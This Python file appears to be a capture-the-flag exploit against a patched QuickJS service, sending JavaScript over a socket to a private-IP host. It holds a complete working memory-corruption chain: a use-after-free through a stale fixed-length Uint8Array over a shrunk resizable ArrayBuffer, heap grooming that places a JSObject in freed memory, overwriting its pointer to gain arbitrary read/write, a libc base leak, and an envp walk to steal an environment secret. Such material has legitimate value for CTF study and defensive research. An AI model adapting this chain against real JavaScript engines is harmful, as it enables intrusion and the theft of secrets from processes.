#!/usr/bin/env python3
"""Exploit for the jsbox patch-4 instance (QuickJS ArrayBuffer resize bug).

Vulnerability (patch (4).diff, hunk 3): js_array_buffer_update_typed_arrays()
only clears a typed array's count/data pointer inside the track_rab branch.
A fixed-length view (explicit length argument => track_rab = FALSE) whose
resizable ArrayBuffer is shrunk therefore keeps its stale count and pointer,
giving OOB read/write over the freed tail of the old backing store.

Exploit chain:
  1. resizable ArrayBuffer ab(0x4000) + fixed-length view ta = Uint8Array(ab,0,0x4000),
     a guard ArrayBuffer(0x4000) after it, then ab.transfer(0) frees the whole
     backing chunk while ta stays usable.
  2. Allocate dummies so a 72-byte-class QuickJS arena (JSObject storage) is
     carved out of the freed chunk; V = new Uint8Array(0x4321) lands its JSObject
     inside that still-mapped, no-longer-allocated memory.
  3. Locate that JSObject in ta, overwrite u.ptr/u.array.count to turn V into an
     arbitrary read/write primitive.
  4. Read the freed unsorted-bin pointer (ta[0]) => main_arena+0x60, find the
     libc base by scanning page-aligned addresses down for \x7fELF.
  5. Scan libc data for stack pointers, pick the envp array, walk it, and read
     the QJS_CTF_FLAG environment string.
"""
import json
import socket
import sys

HOST = "172.16.141.2"
PORT = 8000


def recv_reply(rf):
    line = rf.readline()
    if not line:
        raise RuntimeError("connection closed by service")
    return json.loads(line)


def eval_js(sock, rf, code):
    sock.sendall((json.dumps({"code": code}) + "\n").encode())
    rep = recv_reply(rf)
    if not rep.get("ok"):
        raise RuntimeError("eval failed: %r" % (rep,))
    return rep["result"]


# Stage 1: build the stale view, free its backing store, carve a 72-class arena
# out of the freed chunk, place a typed array's JSObject there, leak main_arena
# and locate libc's base.
SETUP = r"""
var L=0x4000;
var ab=new ArrayBuffer(L,{maxByteLength:L});
var ta=new Uint8Array(ab,0,L);
for(var i=0;i<L;i++)ta[i]=i&255;
var guard=new ArrayBuffer(0x4000);
ab.transfer(0);
function g32(o){return (ta[o]|(ta[o+1]<<8)|(ta[o+2]<<16)|(ta[o+3]<<24))>>>0;}
function g64(o){return g32(o)+g32(o+4)*4294967296;}
var bk=g64(0);
var d=new Array(120);
for(var i=0;i<120;i++)d[i]={};
var V=new Uint8Array(0x4321);
var o=-1;
for(var j=0;j<L-0x40;j+=8){
  if(ta[j+0x12]===23 && g32(j+0x38)===0x4321){o=j;break;}
}
if(o<0)throw Error('JSObject not found');
function s32(o,v){ta[o]=v&255;ta[o+1]=(v>>>8)&255;ta[o+2]=(v>>>16)&255;ta[o+3]=(v>>>24)&255;}
function s64(o,v){s32(o,v%4294967296);s32(o+4,Math.floor(v/4294967296));}
var oldp=g64(o+0x30);
function rd32(a){s64(o+0x30,a);return (V[0]|(V[1]<<8)|(V[2]<<16)|(V[3]<<24))>>>0;}
var start=bk-0x60;
var p0=start-(start%4096);
var base=-1;
for(var k=0;k<0x300;k++){
  var a=p0-k*4096;
  if(a<0x1000)break;
  if(rd32(a)===0x464c457f){base=a;break;}
}
s64(o+0x30,oldp);
[o,bk.toString(16),base<0?0:base.toString(16)]
"""

# Stage 2: scan libc's data/bss above main_arena for stack pointers, walk the
# envp array, and pull out QJS_CTF_FLAG.  String reads stop at the page boundary
# so a long read can never touch an unmapped page above the initial stack.
LEAK = r"""
function rV64(){return V[0]+V[1]*256+V[2]*65536+V[3]*16777216+V[4]*4294967296+V[5]*1099511627776+V[6]*281474976710656+V[7]*72057594037927936;}
function rdq(a){s64(o+0x30,a);return rV64();}
function rdbyte(a){s64(o+0x30,a);return V[0];}
function rdstrsafe(a){
  var lim=4096-(a%4096);
  if(lim>200)lim=200;
  var s='';
  for(var i=0;i<lim;i++){
    var c=rdbyte(a+i);
    if(c===0)break;
    s+=String.fromCharCode(c);
  }
  return s;
}
var st=bk-0x60;
var hits=[];
for(var k=1;k<=0x2000&&hits.length<10;k++){
  var ga=st+k*8;
  var v=rdq(ga);
  if(v>0x7ff000000000&&v<0x800000000000)hits.push([ga,v]);
}
var flag=null;
for(var h=0;h<hits.length&&flag===null;h++){
  var p=hits[h][1];
  var q=rdq(p);
  if(q>0x7ff000000000&&q<0x800000000000){
    for(var i=0;i<40;i++){
      var sp=rdq(p+8*i);
      if(sp===0)break;
      if(sp<0x7ff000000000||sp>=0x800000000000)break;
      var s=rdstrsafe(sp);
      if(s.indexOf('QJS_CTF_FLAG=')===0)flag=s.substring(13);
    }
  }
}
s64(o+0x30,oldp);
flag
"""


def main():
    sock = socket.create_connection((HOST, PORT), timeout=15)
    rf = sock.makefile("rb")
    try:
        o, bk, base = eval_js(sock, rf, SETUP)
        print("[+] JSObject offset : 0x%x" % o)
        print("[+] unsorted bk     : 0x%s" % bk)
        print("[+] libc base       : 0x%s" % base)
        flag = eval_js(sock, rf, LEAK)
        print("[+] QJS_CTF_FLAG    : %s" % flag)
        if not flag or not flag.startswith("FLAG{"):
            print("[-] unexpected flag value", file=sys.stderr)
            return 1
        return 0
    finally:
        try:
            rf.close()
        finally:
            sock.close()


if __name__ == "__main__":
    raise SystemExit(main())
